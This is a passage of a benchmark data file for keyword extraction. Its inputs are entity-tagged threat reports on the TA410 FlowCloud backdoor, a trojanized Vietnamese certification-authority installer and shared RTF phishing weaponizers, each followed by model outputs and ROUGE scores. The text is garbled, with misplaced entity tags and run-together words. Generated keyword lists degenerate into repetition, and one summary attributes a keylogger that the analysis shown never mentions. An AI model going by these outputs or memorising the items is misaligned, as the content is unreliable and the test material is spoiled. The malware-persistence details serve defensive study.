Data Staged : Local prior to exfiltration . FlowCloud can exfiltrate files from local file systems . T1005Data Staging Data from Local System25/26TacticID T1025T1560.002T1560.003T1071.001Data from [ORG] Removable [ORG] Data : Archive via Data : Archive via Non - Application [ORG] Layer [ORG] T1132.001 [ORG] Data Encoding : Standard Encoding T1132.002 Data Encoding : Non- [ORG] Data [ORG] Transfer [ORG] Size Shutdown / RebootT1573.001T1030T1529NameDescriptionFlowCloud can exfiltrate files from removable drives . [PERSON] FlowCloud and [PRODUCT] LookBack use a statically linked zlib library to compress data . FlowCloud compresses some collected data by removing duplicates and similar screen captures . [PRODUCT] LookBack and [PERSON] FlowCloud can send and receive data over [ORG] HTTP.LookBack can communicate over raw [ORG] TCP sockets . [PERSON] FlowCloud uses [ORG] Protobuf to encode [ORG] C&C commands and configuration . [PRODUCT] LookBack encodes binary data using a custom hex - encoding method . [PERSON] FlowCloud can use [WORK_OF_ART] XOR , [ORG] TEA , RC4 and a modified AES algorithm to encrypt traffic and files . [PERSON] FlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration . FlowCloud can force a system crash or [ORG] shutdown.27 Apr 2022 - 03:00PMSign up to receive an email update whenever a new article is published in our Ukraine Crisis \u2013 Digital Security Resource CenterNewsletterDiscussion26/26", "generated_text": "a cyberespionage umbrella group; APT10; at least 2018; victims; the utilities sector; diplomatic organizations; the Middle East and Africa; A new version; FlowCloud; a modular C++ RAT; monitors; microphones; recording; video; audio; controls; addition; control; video, images; macros; files; video recording; microphones; use; the malware; the user; the Royal Road malicious document builder; the group; years; the tools; a new version; Communication; compromise; the compromised machine; the first stage; checks; security software; the compromised machine; the malware; the FlowCloud version; the Advanced AntivirusCheck class; the default configuration value; the FlowCloud version; the current version; the malware; a custom network protocol; HTTP; raw TCP; C&C server communications; a custom network protocol; IP; code execution; reconnaissance; a new version.", "ref_text": "<START-1>The PDF describes research by ESET on a cyberespionage umbrella group they call TA410. ESET believes TA410 consists of 3 teams with different tools and targets: - FlowingFrog uses Royal Road documents, Tendyron malware, and FlowCloud backdoor. They target universities, governments, and companies. - LookingFrog uses X4 and LookBack malware. They hit diplomatic organizations, governments, and companies globally. - JollyFrog uses off-the-shelf malware like PlugX. They target education, military, churches, and diplomacy. TA410 compromises targets by exploiting public-facing apps like Exchange or sending spearphishing. Once inside, they use malware like FlowCloud, which has extensive spying capabilities and advanced evasion techniques. FlowCloud can record audio, take pictures, log keystrokes, steal clipboard data, and more. It uses rootkits, encryption, and sandbox evasion to hide. LookBack uses a custom protocol with encryption and obfuscation to communicate. It can proxy commands and exfiltrate data. ESET notes overlaps in tactics, infrastructure, and targets between the subgroups. But they use different tools, indicating independent teams sharing some resources. TA410 continues actively compromising high-value targets globally. ESET's research reveals the inner workings of this sophisticated threat actor group. Their tools and malware show the capabilities of Chinese state-sponsored espionage. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4213333333333333, "gpt3/lexical/rouge_rouge2": 0.05898123324396783, "gpt3/lexical/rouge_rougeL": 0.21866666666666665, "gpt3/lexical/rouge_rougeLsum": 0.21866666666666665, "gpt3_generated_text": ["ESET researchers have provided a detailed profile of the cyberespionage umbrella group TA410, which has been active since at least 2018 and is loosely linked to APT10. The group consists of three teams - FlowingFrog, LookingFrog, and JollyFrog - each using different toolsets and targeting victims in the utilities sector and diplomatic organizations in the Middle East and Africa. The group has been found to have access to recent Microsoft Exchange vulnerabilities and has been using a new version of the FlowCloud espionage backdoor, a complex and modular C++ RAT with capabilities such as controlling microphones, monitoring clipboard events, and taking pictures using connected cameras. The group also utilizes the Royal Road malicious document builder to compromise their targets and has been found to deploy a custom network protocol for C&C server communications. ESET researchers believe that the group is still undergoing development and testing, as they have found a custom AntivirusCheck class in the current version of FlowCloud. Overall, the group's tactics, techniques, and procedures (TTPs) show a high level of sophistication and indicate a focus on targeted cyberespionage."]}, {"split_name": "test", "sample_id": "test_25", "prompt_text": "Extract the keywords: [ RE018 - 1 ] Analyzing new malware of [GPE] China Panda hacker group used to attack supply chain against [ORG] Vietnam [ORG] Government [ORG] Certification [ORG] Authority [ORG] - [ORG] Part [CARDINAL] 1blog.vincss.net/2020/12/re018-1-analyzing-new-malware-of-china-panda-hacker-group-used-to-attack-supply-chain-against-vietnam-government-certification-authority.htmlI. IntroductionIn process of monitoring and analyzing malware samples , we discovered an interesting blog post of [ORG] NTT here . Following the sample hash in this report , we noticed a hash on [ORG] VirusTotal : Figure [CARDINAL] 1 . Hash \u2019s information in the [ORG] NTT blogOn the event that a hacker group believed to be from [GPE] Russia attacked and exploited the software supply chain to target a series of major [GPE] US agencies , along with discovery that the keyword eToken.exe belongs to the software that is quite popularly used in agencies , organizations and businesses in [GPE] Vietnam , we have used eToken.exe and SafeNet as keywords for searching on [ORG] VirusTotal and [ORG] Google . As a result , we uncovered information [CARDINAL] about [CARDINAL] two remarkable installation files ( [CARDINAL] 1 , 2 ) that have been uploaded to [ORG] VirusTotal since [DATE] August [DATE] 2020:1/23Figure [DATE] 2 . Information look up on VirusTotalThe name of the installation files are quite familiar : gca01-client-v2-x32-8.3.msi and gca01- client-v2-x64-8.3.msi , We have tried to download these [CARDINAL] two files from the website and they have the same hash value . However , at the present time , all files on the [ORG] VGCA homepage have been removed and replaced with the official clean version . According to the initial assessment , we consider this could be an attack campaign aimed at the software supply chain that can be leveraged to target important agencies , organizations and businesses in Vietnam.thOn [DATE] December [DATE] 17 , [ORG] ESET announced a discovery of an attack on [ORG] APT they called \" Operation SignSight \" against [ORG] the [ORG] Vietnam [ORG] Government [ORG] Certification [ORG] Authority ( VGCA ) . In that report , ESET said they have also notified [ORG] VNCERT and [ORG] VGCA and [ORG] VGCA has confirmed that they were aware of the attack before and notified the users who downloaded the trojanized software . At the time of analysis , we have obtained [CARDINAL] two setup files that have been tampered by hackers . This blog post series will focus on analyzing the signatures and techniques that hackers have applied to malicious samples in these [CARDINAL] two installation files . II . Analyze installation fileThis application is named as \" [WORK_OF_ART] SafeNet [WORK_OF_ART] Authentication [WORK_OF_ART] Clients \" from SafeNet .Inc company . Portable Executable ( PE ) files are mostly signed with SafeNet certificates.2/23Figure [CARDINAL] 3 . PE files signed with SafeNet certificateBy using [ORG] UniExtract tool , we extracted the entire file from an installer ( x64 setup file ) . The total number of files is [CARDINAL] 218 files , [CARDINAL] 68 subfolders , the total size is [CARDINAL] 75.1 MB ( [CARDINAL] 78,778,368 bytes ) . To find out which file has been implanted by hackers , we only focus on analyzing and identifying unsigned [ORG] PE files . With the help of sigcheck tool in [GPE] Micorsoft 's SysInternals Suite , with the test parameters is signed , hash , scan all [ORG] PE files , scan the hash on [ORG] VirusTotal , the output is csv file . Then sorting by unsigned file , resulting from [ORG] VirusTotal , we discovered that eToken.exe is the file was implanted by the hacker . Figure [CARDINAL] 4 . Discovered file was implanted by hackerThe hash of this eToken.exe matches with the one in [ORG] NTTSecurity 's report . Another strange point is that it \u2019s a 32bit [ORG] PE but located in the x64 directory , the version information such as \u201c Company , Description , [WORK_OF_ART] Product \u2026 \u201d are not valid for such a large company application . Here is the scan result of the [ORG] eToken file on [ORG] VirusTotal . Since this application is built with [ORG] Visual [ORG] C + + of Visual Studio [DATE] 2005 which is old version , and uses the Qt4 library , some of the dll files of this installer are also unsigned . We checked each file and determined that the files were clean , leaving [CARDINAL] only [CARDINAL] three suspicious files : [PERSON] RegistereToken.exe , eTOKCSP.dll and [ORG] eTOKCSP64.dll . So eToken.exe file is a malware that hackers have added to the installation of the software suite . To find out how eToken.exe is executed , we analyze the installation file : msi file ( [ORG] Microsoft Windows Installer file ): gca01 - client - v2 - x64 - 8.3.msiExtracting the msi file to raw format before installing , we obtained [CARDINAL] two .cab files ( [ORG] Microsoft [ORG] Cabinet file ): Data1.cab and Cabs.w1.cab . This is anomaly because a normal msi file has [CARDINAL] only [CARDINAL] one main .cab file . Check the Data1.cab file and the MSI log text file , eToken.exe and [PERSON] RegistereToken.exe are in Data1.cab file . And both .exe files have no [ORG] GUID ID info:3/23Figure 5 . Exe files do not have a [ORG] GUID ID infoContinue checking the features : DriverFeature , and [CARDINAL] two files eToken.exe and [PERSON] RegistereToken.exe msi file with [ORG] Microsoft 's Orca tool ( a specialized tool for analyze and modify msi files ) . Through a search , the hacker has added a custom action : [ORG] RegisterToken ( without \" e \" before [ORG] Token ) to the msi file and added that [ORG] CustomAction at the end of InstallExecuteSequence . [PERSON] RegistereToken.exe will be called with the parameter is eToken.exe : Figure [CARDINAL] 6 . Hacker implanted a custom actionAnalyzing the [NORP] RegistereToken.exe file , we see that this file was built on \" Wednesday , [DATE] 22.07.2020 [DATE] 07:40:31 UTC \" , ie [DATE] 07/22/2020 , [TIME] 2h40m31s [TIME] PM [TIME] GMT [TIME] +7 , [ORG] PE64 , using [PRODUCT] VC + + [PRODUCT] 2013 : Figure [CARDINAL] 7 . Information of the RegistereToken.exe fileRegistereToken.exe 's pseudo code only calls the [ORG] WinExec API to execute the passed in argument:4/23Figure [CARDINAL] 8 . Tasks of RegistereToken.exeWith all the information above and based on the timestamp in the Data1.cab and [PERSON] RegistereToken.exe files , we can conclude : [PERSON] Hacker has created and modified the .msi file and created the Data1.cab file at timestamp : 07/20/2020 - 15:15 UTC time , added the [PERSON] eToken.exe file at this time . [PERSON] Build [PERSON] RegistereToken.exe file at timestamp : 22/07/2020 - 07:40 UTC [PERSON] Add [PERSON] RegistereToken.exe file to Data1.cab at timestamp : 22/07/2020 - 08:40 UTCNote : According to [PERSON] Cab file format , the two Date and [ORG] Time fields of a file in the cab file are DOS Datetime format , each of which is a Word 2 bytes which reflect the time when the file was added according to DOS time . Cab file processing programs will convert and display in UTC time . That is , the above [ORG] UTC times are the current time on the hacker machine . See more here . Figure [CARDINAL] 9 . MS DOS Datetime InformationIII . Analyze eToken.exe5/231 . Analyze PE StructureFile eToken.exe : Size : [CARDINAL] 192 [PERSON] KB ( [CARDINAL] 196,608 bytes ) 97A5FE1D2174E9D34CEE8C1D6751BF01F99D8F40B1AE0BCE205B8F2F0483225CInformation about compiler , RichID and build timestamp : Build with VC + + 6 of [ORG] Microsoft [ORG] Visual [ORG] Studio , Service Pack 6 . Build at : 26/04/2020 - 15:12:58 [ORG] UTC [ORG] Checksum is correct , file has not been modified [PERSON] PE [PERSON] Header . Linking with MFC42.dll library , [ORG] Microsoft [ORG] Foundation Class v4.2 library of [ORG] Microsoft , is a library supporting [ORG] GUI programming on Windows , always included in [PERSON] Visual [PERSON] Studio suite . Link with a special library : dbghelp.dll . Use the MakeSureDirectoryPathExist API function . See more here . Checking the resource section of the file , we determined that this is a Dialog application , created by [PERSON] MFC [PERSON] Wizard of Visual Studio 6 . The project name is [ORG] VVSup , which means the .exe file when built out would be VVSup.exe . Figure [CARDINAL] 10 . File 's resource information6/232 . Static code analysiseToken.exe ( VVSup.exe ) is built with dynamic link DLL mode with MFC42.dll , so the .exe file will be small and the functions of the MFC42 libirary will be easily identified via the name import of the [ORG] DLL . The name mangling rule of [ORG] Microsoft [ORG] VC + + compiler reflects the class name , function name , parameter name , call type of functions . [ORG] IDA helps us to define the functions import by ordinal of MFC42.dll using the file mfc42.ids and mfc42.idt included with IDA.However , [ORG] VVSup is built with the RTTI ( Runtime Type Information ) option is disabled , so there is no information about the [FAC] RTTI and Virtual Method Table of all classes in the file . We only have RTTI of class type_info , the root class of [LAW] RTTI.Figure [LAW] 11 . [PERSON] RTTI [PERSON] Info of type_info classThe analysis will show how to define classes , recreate the code of this malware , and share experience in applying when analyzing malwares / files using [ORG] MFC.Plugins used : Simabus \u2019s [ORG] ClassInformer Matrosov \u2019s HexRaysCodeXplorer MFC_HelperThe [ORG] MFC [ORG] C++ source code can be found in the src\\mfc directory of the Visual Studio installer . Since [PERSON] MFC4.2 ( [ORG] MFC [ORG] of [ORG] VS6 ) is very old , it can be found on [GPE] Github . We refer here . About the relationship chart of the classes of [ORG] MFC ( [PERSON] Hierarchy [PERSON] Chart ) , you can see at this link . [CARDINAL] Three important dlls file to diffing / compare with [ORG] MFC malware , for example in this sample [ORG] eToken , are mfc42.dll , mfc42d.dll , mfco42d.dll . You can find and download the correct debug symbol file ( .pdb ) of the dlls you have . The most important [CARDINAL] one is mfc42d.dll ( debug build ) , since its .pdb will contain full information about the types , enumes , classes , and vtables of the [ORG] MFC classes . We export local types from mfc42d.dll to .h file , then import into our idb database . [ORG] IDA 's [ORG] Parse [ORG] C + + has an error , unable to parse the \" < > \" template syntax , so we find and replace pairs of \" < \" and \" > \" to \" _ \" in .h files . Parallel opening mfc42d.dll in new [ORG] IDA together with [ORG] IDA is parsing malware , copy names , types of classes , functions from mfc42d.dll . As mentioned , this malware is an [ORG] MFC [ORG] Dialog application , so we will definitely have the following classes in the malware : CObject , CCmdTarget , CWinThread , CWnd , [ORG] CDialog . According to the [PERSON] MFC [PERSON] Wizard 's auto - naming rule , we have classes with the following names : [ORG] CVVSupApp ( inherited from CWinApp ) , [ORG] CAboutDlg ( dialog About , [ORG] resID = [CARDINAL] 100 ) , CVVSupDlg ( main dialog , [ORG] resID = [CARDINAL] 102).Scan results of vtables , classes of [CARDINAL] two plugins ClassInformer and HexRaysCodeXplorer.7/23Figure 12 . Scanning vtables , classes resultUse [ORG] MFC_Helper scan CRuntimeClass , as expected , CVVSupDlg has CRuntimeClass and add another class : CVVSupDlgAutoProxy . It shows that the hacker when running the [PERSON] MFC [PERSON] Wizard , clicked to select support [ORG] OLE [ORG] Control . Figure [CARDINAL] 13 . Detect classe after run MFC_HelperBased on the import function CWinApp::GetRuntimeClass , we can determine CVVSupApp vtable , and based on CDialog::GetRuntimeClass we can define [CARDINAL] two vtables of the other [CARDINAL] two dialogs . But which dialog is About , which dialog is a malware dialog ? Identify all the internal structures of MFX such as [GPE] AFX_MSGMAP , [ORG] AFX_DISPMAP , [ORG] AFX_INTERFACEMAP [ORG] Using the [ORG] Xref to feature call the [NORP] CDialog constructor : void _ _ thiscall CDialog::CDialog ( [NORP] CDialog * this , unsigned int nIDTemplate , CWnd * pParentWnd ) , [ORG] nIDTemplate is the [ORG] resID of the dialog , we define the vtable of [NORP] CAboutDlg and [PERSON] CMalwareDlg . Because [PERSON] CMalwareDlg does not have CRuntimeClass and [FAC] RTTI , so it is temporarily named like that . The hacker deleted the DECLARE_DYNAMIC_CREATE line of these [CARDINAL] two classes and the CVVSupApp class when build.8/23Figure [CARDINAL] 14 . Identify vtable of [ORG] CAboutDlg and CMalwareDlgRelational Classes table of this malware:9/23Figure [CARDINAL] 15 . Relational classes table of this malwareCopy the names of functions , types , function types , parameters from the respective parent classes of the above classes , in the correct order in the vtable , identify the generated [PERSON] MFC [PERSON] Wizard functions and the functions the hacker wrote . Figure [CARDINAL] 16 . Result after copy name of functions , types , function types , parametersEvery [ORG] MFC application has a global variable called theApp , belonging to the main class CXXXApp inheriting from CWinApp . In the case of this malware are : CVVSupApp theApp ; This global variable is initialized by C [ORG] RTL in the start function , called before main / WinMain , in table _ _ [PERSON] xc_a . The functions in this table call after the C RTL constructors in _ _ [ORG] xi_a . These tables are the parameters passed to the internal _ initterm function of C RTL.10/23Figure 17 . TheApp global variable in the MFC applicationThe flowchart of creating and executing an [ORG] MFC application is as follows : Figure [CARDINAL] 18 . Flowchart of creating and executing an MFC applicationThe CVVSupApp : : InitInstance function is also a common code generated by [ORG] MFC wizard11/23Figure [CARDINAL] 19 . CVVSupApp::InitInstance functionConstructor of CVVSupDlg : void CVVSupDlg::CVVSupDlg ( ) is also common code generated by [PERSON] MFC [PERSON] Wizard . But in CVVSupDlg::OnInitDialog , which is called from CVVSupDlg::DoModal ( ) , we can see immediately , at the end of the code that the MFC Wizard generated , [PERSON] CMalwareDlg is initialized and shown , then the malware exits forcibly exit ( 0).12/23Figure [CARDINAL] 20 . [PERSON] CMalwareDlg was created and shownThe value [CARDINAL] 129 is the resID of the [PERSON] CMalwareDlg dialog , and sizeof(CMalwareDlg ) = 0x290 , which is larger than the size of the parent [ORG] CDialog . It proves that [PERSON] CMalwareDlg was added by hackers to some data members . Through analysis , we recreated the data members of [PERSON] CMalwareDlg : Figure [CARDINAL] 21 . Recreate data members of [ORG] CMalwareDlgThe [ORG] CMalwareDlg::CMalwareDlg [ORG] Constructor does the following initialization jobs . Note the copy string \" [CARDINAL] 192.168 \" into the field m_szMask:13/23Figure [CARDINAL] 22 . Copy \" [CARDINAL] 192.168 \" string to m_szMask fieldWhen shown , CMalwareDlg::OnInitDialog will be called , and the main function that is important for doing the malware 's task is called here : Figure [CARDINAL] 23 . The [ORG] Infect main function will do the malware 's jobThe Infect ( we named ) function is relatively long , so it should be presented via the flowchart below : Figure [CARDINAL] 24 . Infect function flowchart14/23We'll go into detail each of the important child functions called by the Infect function of the [PERSON] CMalwareDlg class . The UserIsAdmin function , using the IsUserAdmin ( ) API of shell32.dll : Figure [CARDINAL] 25 . UserIsAdmin fuctionGetSomeAPIAddrs function is a redundant function , function pointers are taken but completely unused . We guess this could be an old code . Figure [CARDINAL] 26 . GetSomeAPIAddrs function15/23The Base64Decode function is like other Base64 decode functions , except that the [PERSON] Base64 code table is copied by the hacker to a char arrary m_szBase64Table and accessed from here . After being decoded [PERSON] Base64 , the original [ORG] ServiceName \" TmV0QmlvcyBNZXNzYWdlciBSZWdpc3Rlcg== \" will be \" NetBios Messager Register \" . The original ServiceDescription \" TmV0QmlvcyBjb21tdW5pY2F0aW9uIGJldHdlZW4gc3lzdGVtIGNvbXBvbmVudHMu \" would be \" [PRODUCT] NetBios communication between system components . \"The ExtractCabFile function is a global function , not part of the [PERSON] CMalwareDlg class . Note that the file is created with the attribute hidden . Figure [CARDINAL] 27 . ExtractCabFile functionThe .cab file is completely embedded in the .data section , size = [CARDINAL] 94874 ( 0x1729A ) . Hackers declared the following equivalent : \" static [PERSON] BYTE g_abCabFile [ ] = { [CARDINAL] 0xXXXX , 0xYYYY } ; \" ( no const , so it will be located in .data section ) . Extracting that area , we have a .cab file containing a file , named [PERSON] smanager_ssl.dll , the date added to the cab is [PERSON] 04/26/2020 [PERSON] - [PERSON] 23:11 [ORG] UTC , build date 26.04.2020 [TIME] 15:11:24 [DATE] UTC.Figure [DATE] 28 . The embedded .cab file contains the file smanager_ssl.dllThe [PERSON] smanager_ssl.dll file ( netapi32.dll ) will be analyzed in the next post because it is relatively complex.16/23Figure [CARDINAL] 29 . RunExtrac32Exe functionThe ExecuteAndWait function is also a global function , using the ShellExecuteExA API to call and wait until the execution completes . Figure [CARDINAL] 30 . ExecuteAndWait functionThe Config of the [PERSON] Proxy on the victim machine is defined by the hacker through a struct as shown , PROXY_TYPE is an enum : Figure [CARDINAL] 31 . struct PROXY_CONFIG17/23The ReadProxyConfig function will read from the victim 's registry [ORDINAL] first , otherwise it will read from the Firefox pref.js file . We are still not clear why hackers tried to read from Firefox , maybe they did a reconnaisance to learn about the commonly used web browsers at the target . Figure [CARDINAL] 32 . ReadProxyConfig functionThe ReadProxyConfigFromRegistry function is a bit long so there are only important parts : Figure [CARDINAL] 33 . The main job of the ReadProxyConfigFromRegistry function18/23The [GPE] ReadProxyConfigFromFireFox function is very long so we wo n't cover it in detail here . The [ORG] UpdateFile function uses the memsearh equivalent function to find a string in the file 's content , and C&C [PERSON] Info will be written at the found location . In the case of this malware , the mask string is \" [CARDINAL] 192.168\" . Figure [CARDINAL] 34 : The [ORG] UpdateFile function uses the memsearh equivalent function to find a stringWe recreated the C&C [PERSON] Info struct as follows : Figure [CARDINAL] 35 . struct of [ORG] C&C infoAnd [ORG] C&C info has been hardcoded by hackers in the code:19/23Figure [CARDINAL] 36 . [ORG] C&C information is hardcoded in the malicious codeThe content of smanager_ssl.dll * ( netapi32.dll * * ) is original and after being updated from g_CCInfo structure via : Figure [CARDINAL] 37 . Contents of smanager_ssl.dll file ( netapi32.dll ) before and after being updatedThe function to load the extracted file and create the Scheduler Task:20/23Figure 38 . Function LoadDllAndCreateSchedulerTask to load the extracted file and create a [PERSON] Scheduler TaskThen , if the malware is run with admin , it will register as a [ORG] ServiceDll , with the name mentioned above , the [ORG] Service registry key chosen at random from a table of [CARDINAL] ten elements , and appended \" Ex \" . These series include : \" Winmads \" , \" Winrs \" , \" Vsssvr \" , \" [PERSON] PlugSvr \" , \" WaRpc \" , \" GuiSvr \" , \" [ORG] WlanSvr \" , \" DisSvr \" , \" [ORG] MediaSvr \" , \" NvdiaSvr\" . After appending Ex by the sprintf function , the registry key on the victim machine is created under the branch HKLM\\SOFTWARE\\Microsoft\\Windows [NORP] NT\\CurrentVersion\\Svchost will be one of the following strings : \u201c WinmadsEx \u201d , \u201c WinrsEx \u201d , \u201c [ORG] VsssvrEx \u201d , \u201c PlugSvrEx \u201d , \u201c WaRpcEx \u201d , \u201c GuiSvrEx \u201d , \u201c WlanSvrEx \u201d , \u201c [ORG] DisSvrEx \u201d , \u201c MediaSvrEx \u201d , \u201c NvdiaSvrEx\u201d . Since the function is also a bit long , only the main points are covered here : Figure [CARDINAL] 39 . Create a registry key on a victim machine21/23Figure [CARDINAL] 40 . Create service on victim machineThe RegistryCall function is a self - written function by hacker , it is a global function , also only doing tasks with the Registry . From our point of view , hackers ' programming styles are extremely messy and inconsistent ( maybe this is how they intentionally confusing ) , which made it difficult for us to analyze . After registering as a [PERSON] Dll service , the Infect function completes and returns . [ORG] Malware will exit because of the above call to exit(0 ) on OnInitDialogWe will provide .xml file containing analysis information on [ORG] IDA so anyone interested in this malware can use it to re - import [ORG] IDA and [PERSON] Ghidra using [PERSON] Ghidra 's plugin [ORG] xml_importer.py.22/23The IOCs of the malicious code have been noted in the article . You can write your own .bat file or script using [ORG] PowerShell , VBS to find and remove this malware on the victim 's computers . Note : Original smanager_ssl.dllMD5 : [PERSON] C11E25278417F985CC968C1E361A0FB0 SHA256 : [NORP] F659B269FBE4128588F7A2FA4D6022CC74E508D28EEE05C5AFF26CC23B7BD1A5netapi32.dll ( ie smanager_ssl.dll has updated [CARDINAL] CCInfo):MD5 : [CARDINAL] 43CE409C21CAD2EF41C9E1725CA12CEA SHA256 : [CARDINAL] 6C1DB6C3D32C921858A4272E8CC7D78280B46BAD20A1DE23833CBE2956EEBF75Click here for [NORP] Vietnamese version : Part [CARDINAL] 1 , Part [CARDINAL] 2Tr\u01b0\u01a1ng Qu\u1ed1c Ng\u00e2n ( aka HTC)Malware Analysis - VinCSS ( a member of Vingroup)23/23", "generated_text": "VirusTotal; Chinese Panda; supply chain; Vietnam Government Certification Authority; the malware; unsigned PE files; the hash; eToken.exe; NTTSecurity; an attack; ESET; the VGCA; the attackers; a 32-bit PE; the infected machine; the archive; the backdoor; the rootkit; the malware; Windows; mode; the backdoor; the backdoor; the backdoor; the backdoor; a command; control; the backdoor; the server; the incoming traffic; the backdoor; the server; the malware; the backdoor; the backdoor; RDP; a process; the backdoor; an actor; the backdoor; a keylogger; the backdoor; the backdoor; the backdoor; the backdoor; the backdoor; the backdoor; a system; files; the backdoor; the backdoor; the backdoor; the backdoor; the victim; the backdoor; the backdoor; the backdoor; the backdoor; DLLs; the backdoor; the backdoor; the backdoor; the backdoor; the backdoor; the backdoor;", "ref_text": "<START-1>The PDF analyzes new malware used by the China Panda hacker group in attacks against the Vietnam Government Certification Authority (VGCA). In August 2020, trojanized VGCA software installers containing new malware were uncovered. The malware includes the files eToken.exe, RegistereToken.exe, and a DLL. Analysis shows the trojanized installer runs a custom action to execute eToken.exe, which contains the main malicious functionality. eToken.exe is built with Visual Studio 6 and MFC. It extracts and executes a DLL, creates scheduled tasks, installs as a service, and configures command and control servers. The DLL payload is a backdoor named smanager_ssl.dll that is implanted in the software supply chain. It is extracted from an embedded .cab file. Command and control IP addresses and domain names are hardcoded in the malware. A registry key is chosen randomly to install the service. The attack leverages the supply chain of VGCA software to target the government, agencies, organizations, and businesses in Vietnam that use the software. In summary, the report provides an in-depth analysis of the structure, functionality, and techniques of the new malware used in supply chain attacks against VGCA to target entities in Vietnam. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5222551928783382, "gpt3/lexical/rouge_rouge2": 0.22089552238805968, "gpt3/lexical/rouge_rougeL": 0.3026706231454006, "gpt3/lexical/rouge_rougeLsum": 0.3026706231454006, "gpt3_generated_text": ["This article analyzes a new malware used by the Chinese Panda hacker group to attack the supply chain of the Vietnam Government Certification Authority. The malware, identified as eToken.exe, was discovered in unsigned PE files and was implanted by hackers into the installation files of SafeNet Authentication Clients. The malware, a 32-bit PE file located in an x64 directory, was found to be a backdoor that allows attackers to control the infected machine, execute commands, and exfiltrate data. The malware also includes a keylogger and can communicate with a command and control server to receive instructions. The analysis of the malware revealed several suspicious files, including RegistereToken.exe, eTOKCSP.dll, and eTOKCSP64.dll, which were determined to be clean. The attackers behind this campaign have leveraged the software supply chain to target important agencies, organizations, and businesses in Vietnam."]}, {"split_name": "test", "sample_id": "test_26", "prompt_text": "Extract the keywords: Analyzing Digital Quartermasters in [LOC] Asia \u2013 Do [NORP] Chinese and [NORP] Indian APTs Have a Shared Supply Chain?anomali.com / blog / analyzing - digital - quartermasters - in - asia - do - chinese - and - indian - apts - have - a - shared - supply - chainAnomali Labs recently analyzed a large number of weaponized RTF phishing files related to [ORG] APT groups aligned with [NORP] Chinese and [NORP] Indian state interests . This analysis has identified a shared object dimension and shared obfuscation methods across weaponized RTF files utilized by the [ORG] APT groups known as [LAW] Sidewinder ( [LAW] Indian [LAW] State [LAW] Interests ) , [PERSON] Goblin [PERSON] Panda [PERSON] / [PERSON] Conimes ( [NORP] Chinese State Interests ) , [PERSON] Temp . [PERSON] Periscope/ [PERSON] APT40 [PERSON] / [PERSON] Leviathan ( Chinese State Interests ) , and [PERSON] Temp . Trident / Dagger Panda & [PERSON] Nomad [PERSON] Panda [PERSON] / [PERSON] Icefog ( [NORP] Chinese State Interests ) . Both unique object dimensions and multiple shared obfuscation methods are visible in the [ORG] RTF files which appear to be artifacts of a shared [ORG] RTF phishing weaponizer . In addition to shared [ORG] RTF properties , a distinct pattern of post - exploitation [ORG] TTP \u2019s is shared between the [ORG] APT groups aligned with [GPE] China , whereas a unique post - exploitation execution chain can be seen in Sidewinder [ORG] APT campaigns . The use of a common RTF phishing weaponizer alongside distinct post - exploitation TTPs introduces the possibility that [NORP] Chinese and [NORP] Indian APTs may have an overlapping supply chain for the acquisition of exploits and phishing weaponizers . However , after these tools are acquired a distinct and complex network of [ORG] APT digital quartermasters may determine how these tools are equipped with payloads and deployed in distinct operations . Using Object Dimensions to Track RTF Phishing WeaponizersRTF files are among the most popular file formats used in phishing attacks [DATE] today . To create a weaponized [ORG] RTF file capable of exploiting a common vulnerability exploit ( \u201c CVE \u201d ) , RTF weaponizers are often used which consist of a script that injects a malicious [ORG] RTF object into a pre - crafted RTF phishing document . The resulting weaponized exploit file can then be attached to a phishing email and sent to a victim . When RTF weaponizers are acquired or purchased , it is common for operators to change aspects of the weaponizer payload which occurs after initial [ORG] CVE exploitation . However , it is less common for operators to change the object header and dimensions within [ORG] the [ORG] RTF [ORG] Weaponizer , resulting in shared unique object dimensions across weaponized exploits created by adversaries . Object dimensions are represented in the [ORG] RTF strings as \u201c \\objhN \u201d for height and \u201c \\objwN \u201d for width . Analysts can identify related samples with matching unique object dimensions by hunting for samples with object dimensions sharing these properties . RTF [CARDINAL] 1.14 [ORG] SpecificationAnomali [ORG] Labs identified a unique object dimension present in RTF phishing files weaponized with CVE-2017 - 11882 and CVE-2018 - 0802 which appear to be utilized by numerous [NORP] Asian [ORG] APT groups . The identified RTFs all share a unique object height and width , which determine how the object will be rendered in Microsoft Word . Specifically the object dimensions \u201c objw2180\\objh300 \u201d are present in the [ORG] RTF files and have been observed in phishing files linked to the [ORG] APT groups Sidewinder , [PERSON] Goblin [PERSON] Panda , [PERSON] Temp . [PERSON] Periscope , and [PERSON] Temp . Trident . Additionally , object data present in the [ORG] RTF files were shared between a number of samples utilized by these groups . There are multiple RTF obfuscation strings constant among these samples which is a byproduct of the obfuscation utilized by [ORG] the [ORG] RTF [ORG] Weaponizer . This shared obfuscation output enforces the likelihood of this phishing weaponizer being utilized by multiple actors and possibly originating from an overlapping supply chain.11/61 It is worth noting that similarities between [PERSON] Sidewinder and [PERSON] Goblin [PERSON] Panda RTFs have historically been identified by security researchers . Additionally , the VietTimes in [DATE] August [DATE] 2018 wrote of a targeted attack against a number of [ORG] Vietnamese [ORG] State [ORG] Agencies in Da [GPE] Nang , [GPE] Vietnam that [CARDINAL] 2 were identified during an investigation into [LAW] Sidewinder [LAW] APT activity . This activity was later attributed to [ORG] the [ORG] Goblin [ORG] Panda [ORG] / [ORG] Conimes group .Distinct Execution TechniquesDespite all identified [NORP] APT samples sharing unique RTF object dimensions and obfuscation methods , [CARDINAL] two distinct methods covered at length below for executing payloads were found . The Sidewinder APT downloads and executes a payload via an [ORG] HTA file and the [CARDINAL] three clusters of [NORP] Chinese APT activity drop shellcode via an [ORG] OLE package which pulls down a source file for payload execution . [ORG] The [ORG] Sidewinder [ORG] APT has historically targeted organizations linked to [LOC] the [LOC] Pakistani [LOC] Military and is believed by security researchers to be an actor associated with [NORP] Indian espionage interests possibly operating as a contractor in the space . Sidewinder has conducted campaigns targeting [PRODUCT] Windows and [ORG] Android - based systems . Their use of weaponized [ORG] RTF files with unique object dimensions in phishing campaigns rely on the successful exploitation of CVE-2017 - 11882 in which the opened [ORG] RTF file downloads and executes [ORG] HTA files on the victim \u2019s machine . Primarily [LANGUAGE] English language phishing files that invoke topics involving the military borders of [GPE] India , [GPE] China , and [GPE] Pakistan are weaponized and require execution by the victim to pull down additional files including a malicious .hta . Once the .hta has been downloaded from a C2 domain and executed , the [CARDINAL] 4 powershell payload contained in the .hta file can then be executed on a victim \u2019s system .36Alternatively 